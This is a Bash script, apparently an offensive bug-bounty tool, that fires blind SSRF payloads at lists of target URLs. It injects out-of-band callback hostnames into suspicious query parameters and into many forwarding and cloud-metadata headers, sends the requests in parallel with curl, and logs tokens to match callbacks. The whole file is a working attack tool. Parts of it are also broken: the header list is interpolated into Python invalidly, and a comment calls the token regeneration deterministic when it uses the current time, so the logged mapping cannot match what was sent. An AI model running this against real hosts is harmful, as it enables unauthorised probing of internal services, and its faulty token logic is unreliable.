#!/usr/bin/env bash
# ssrf_blinder_minimal.sh
# Minimal, single-token-map SSRF blinder:
# - One param token per matched endpoint (param_tests.txt)
# - One header token per (unique subdomain, header)
# - Records only:
#     - tokens_map.tsv (all tokens mapping)
#     - param_tests.txt (param-injected URLs)
#     - sent_requests.log (what we sent + HTTP code)
#
# Usage:
#   ./ssrf_blinder_minimal.sh <OAST_ROOT> <ssrf.txt> [ssrf_headers.txt] [concurrency]
set -euo pipefail
IFS=$'\n\t'

if [[ $# -lt 2 ]]; then
  echo "Usage: $0 <OAST_ROOT> <ssrf.txt> [ssrf_headers.txt] [concurrency]"
  exit 2
fi

OAST_ROOT="$1"
SSRF_FILE="$2"
HEADERS_FILE="${3:-}"
CONCURRENCY="${4:-40}"

WORKDIR="./ssrf_blinder_minimal_out"
mkdir -p "$WORKDIR"

TOKENS_MAP="$WORKDIR/tokens_map.tsv"     # token<TAB>payload<TAB>type<TAB>target<TAB>meta<TAB>ts
PARAM_TESTS="$WORKDIR/param_tests.txt"   # one injected URL per matched endpoint
SENT_LOG="$WORKDIR/sent_requests.log"    # ts<TAB>token<TAB>payload<TAB>target<TAB>meta<TAB>http_code

: > "$TOKENS_MAP"
: > "$PARAM_TESTS"
: > "$SENT_LOG"

# Param keywords
PARAMS=(access admin dbg debug edit grant test alter clone create delete disable enable exec execute
load make modify rename reset shell toggle adm root cfg dest redirect uri path continue url
window next data reference site html val validate domain callback return page feed host port to out
view dir show navigation open file document folder pg php_path style doc img filename)
PARAMS_PY_REPR="["$(printf "'%s'," "${PARAMS[@]}" | sed "s/,$//")"]"

# load headers or default
DEFAULT_HEADERS=(X-Forwarded-For X-Forwarded-Host X-Forwarded-Scheme X-Forwarded-Proto X-Real-IP X-Client-IP X-Remote-IP X-Original-URL X-Rewrite-URL Destination X-Host X-Original-Host Forwarded X-Requested-With X-Http-Method-Override X-Custom-IP-Authorization X-AWS-EC2-Metadata-URL X-GCE-Metadata-URL Metadata X-File-Path X-Path)
HEADERS=()
if [[ -n "$HEADERS_FILE" && -f "$HEADERS_FILE" ]]; then
  while IFS= read -r L || [[ -n "$L" ]]; do
    LTRIM=$(echo "$L" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
    [[ -n "$LTRIM" ]] && HEADERS+=("$LTRIM")
  done < "$HEADERS_FILE"
else
  HEADERS=("${DEFAULT_HEADERS[@]}")
fi

echo "[INFO] OAST root: $OAST_ROOT"
echo "[INFO] ssrf file: $SSRF_FILE"
echo "[INFO] headers: ${#HEADERS[@]}"
echo "[INFO] concurrency: $CONCURRENCY"
echo

# normalize line endings
if command -v sed >/dev/null 2>&1; then
  sed -i 's/\r$//' "$SSRF_FILE" || true
  if [[ -n "$HEADERS_FILE" ]]; then sed -i 's/\r$//' "$HEADERS_FILE" || true; fi
  sed -i 's/\r$//' "$0" || true
fi

# STEP 1: Build param tokens & tests (one per matched endpoint)
nl -ba "$SSRF_FILE" | while read -r idx url; do
  matched_key=$(python3 - <<PY
from urllib.parse import urlparse, parse_qsl
u = """${url}"""
p = urlparse(u)
qs_keys = [k.lower() for k,_ in parse_qsl(p.query)]
path_keys = [seg.lower() for seg in p.path.split('/') if seg]
all_keys = qs_keys + path_keys
param_list = ${PARAMS_PY_REPR}
found = None
for k in all_keys:
    if k in param_list:
        found = k; break
if found:
    print(found)
else:
    raw = u.lower()
    for cand in param_list:
        if ('?' + cand + '=') in raw or ('&' + cand + '=') in raw:
            print(cand); exit(0)
    exit(0)
PY
)
  if [[ -n "$matched_key" ]]; then
    token=$(printf "%s|%s|%s" "$idx" "$url" "$(date +%s%N)" | sha1sum | cut -c1-12)
    payload="${token}.${OAST_ROOT}"
    ts=$(date -Iseconds)
    echo -e "${token}\t${payload}\tPARAM\t${url}\tparam:${matched_key}\t${ts}" >> "$TOKENS_MAP"

    # build param-injected URL safely
    injected=$(python3 - <<PY
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
u = """${url}"""
p = urlparse(u)
qs = dict(parse_qsl(p.query))
qs["${matched_key}"] = "http://${payload}"
new_q = urlencode(qs, doseq=True)
print(urlunparse((p.scheme, p.netloc, p.path, p.params, new_q, p.fragment)))
PY
)
    echo "${injected}" >> "$PARAM_TESTS"
  fi
done

TOTAL_PARAMS=$(wc -l < "$PARAM_TESTS" || echo 0)
echo "[INFO] Created $TOTAL_PARAMS param tests (one per matched endpoint)."

# STEP 2: Execute param tests (parallel worker) and log results
WORKER_P="$(mktemp --suffix=_worker_param.sh)"
cat > "$WORKER_P" <<'WEND'
#!/usr/bin/env bash
set -euo pipefail
IFS=$'\n\t'
LINE="$1"
WORKDIR="$(cd "$(dirname "$0")" && pwd)/.."
SENT_LOG="$WORKDIR/sent_requests.log"
# the injected URL contains the token in the query value host, extract token
# parse host from injected URL:
token_host=$(python3 - <<PY
from urllib.parse import urlparse
u = """${LINE}"""
try:
    p = urlparse(u)
    # find token by scanning query values for a host matching pattern token.oastroot
    qs = p.query
    # best effort: extract host substring from qs value
    # fallback: take substring between 'http://' and first '/' or '&'
    import re
    m = re.search(r'http://([^/:&\\?]+)', qs)
    if m:
        print(m.group(1))
    else:
        print("")
except Exception:
    print("")
PY
)
token=$(printf "%s" "$token_host" | cut -d'.' -f1)
payload="$token_host"
# perform request
CURL=(--silent --max-time 12 --output /dev/null --write-out "%{http_code}")
http_code=$(curl "${CURL[@]}" "$LINE" 2>/dev/null) || http_code="ERR"
now=$(date -Iseconds)
printf "%s\t%s\t%s\t%s\t%s\t%s\n" "$now" "$token" "$payload" "$LINE" "PARAM" "$http_code" >> "$SENT_LOG"
WEND
chmod +x "$WORKER_P"
# normalize worker line endings
sed -i 's/\r$//' "$WORKER_P" || true

echo "[INFO] Running param tests (concurrency=$CONCURRENCY)..."
cat "$PARAM_TESTS" | xargs -d '\n' -P "$CONCURRENCY" -I '{}' "$WORKER_P" '{}'
rm -f "$WORKER_P"

# STEP 3: extract unique subdomains from original matched endpoints (from TOKENS_MAP), then queue header tests for those subdomains only
python3 - <<PY > "$WORKDIR/tmp_subdomains.txt"
from urllib.parse import urlparse
seen=set()
with open("$TOKENS_MAP","r") as f:
    for line in f:
        parts=line.strip().split('\t')
        if len(parts) < 4: continue
        orig = parts[3]
        try:
            net = urlparse(orig).netloc
            if net and net not in seen:
                print(net)
                seen.add(net)
        except Exception:
            pass
PY

NUM_SUBS=$(wc -l < "$WORKDIR/tmp_subdomains.txt" || echo 0)
echo "[INFO] Found $NUM_SUBS unique subdomain(s) to fuzz headers."

# Step 4: create header tokens and run header worker (no extra persistent queue file)
WORKER_H="$(mktemp --suffix=_worker_header.sh)"
cat > "$WORKER_H" <<'WEND'
#!/usr/bin/env bash
set -euo pipefail
IFS=$'\n\t'
LINE="$1"
WORKDIR="$(cd "$(dirname "$0")" && pwd)/.."
SENT_LOG="$WORKDIR/sent_requests.log"
# LINE format: subdomain<TAB>token<TAB>payload<TAB>HDR:<headername>
IFS=$'\t' read -r sub token payload meta <<< "$LINE" || true
hdr="${meta#HDR:}"
CURL=(--silent --max-time 12 --output /dev/null --write-out "%{http_code}")
# choose https by default
tgt="https://${sub}"
http_code=$(curl "${CURL[@]}" -H "${hdr}: http://${payload}" "$tgt" 2>/dev/null) || http_code="ERR"
now=$(date -Iseconds)
printf "%s\t%s\t%s\t%s\tHEADER:%s\t%s\n" "$now" "$token" "$payload" "$tgt" "$hdr" "$http_code" >> "$SENT_LOG"
WEND
chmod +x "$WORKER_H"
sed -i 's/\r$//' "$WORKER_H" || true

# build a temporary header queue in-memory via a process substitution to avoid persistent queue files
echo "[INFO] Sending header tests (headers × subdomains) ..."

# Build lines and stream them into xargs for parallel processing
# Format per line: subdomain<TAB>token<TAB>payload<TAB>HDR:<headername>
python3 - <<PY | xargs -d '\n' -P "$CONCURRENCY" -I '{}' "$WORKER_H" '{}'
import sys,hashlib,time
oast = """${OAST_ROOT}"""
headers = ${HEADERS}
with open("${WORKDIR}/tmp_subdomains.txt","r") as f:
    subs=[s.strip() for s in f if s.strip()]
for sub in subs:
    for hdr in headers:
        token = hashlib.sha1((sub + hdr + str(time.time())).encode()).hexdigest()[:12]
        payload = token + "." + oast
        ts = ""  # not writing timestamp here; mapping saved next via echo below in bash
        print(sub + "\t" + token + "\t" + payload + "\t" + "HDR:" + hdr)
PY

# while creating header jobs above we must also persist mapping lines to TOKENS_MAP
# regenerate the same sequence deterministically to write tokens into TOKENS_MAP
python3 - <<PY >> "$TOKENS_MAP"
import sys,hashlib,time
oast = """${OAST_ROOT}"""
headers = ${HEADERS}
with open("${WORKDIR}/tmp_subdomains.txt","r") as f:
    subs=[s.strip() for s in f if s.strip()]
for sub in subs:
    for hdr in headers:
        token = hashlib.sha1((sub + hdr + str(time.time())).encode()).hexdigest()[:12]
        payload = token + "." + oast
        from datetime import datetime
        ts = datetime.now().isoformat()
        # token<TAB>payload<TAB>HEADER<TAB>subdomain<TAB>HEADER:<hdr><TAB>ts
        print(f"{token}\t{payload}\tHEADER\t{sub}\tHEADER:{hdr}\t{ts}")
PY

# cleanup worker scripts and tmp files
rm -f "$WORKER_H"
rm -f "$WORKDIR/tmp_subdomains.txt"

echo
echo "[DONE] All requests sent."
echo "[FILES kept]"
echo " - tokens map: $TOKENS_MAP"
echo " - param tests: $PARAM_TESTS"
echo " - sent log: $SENT_LOG"
echo
echo "To map an Interactsh token -> what caused it:"
echo "  grep -P '^<token>\\t' \"$TOKENS_MAP\""
echo "  grep -P '\\t<token>\\t' \"$SENT_LOG\""
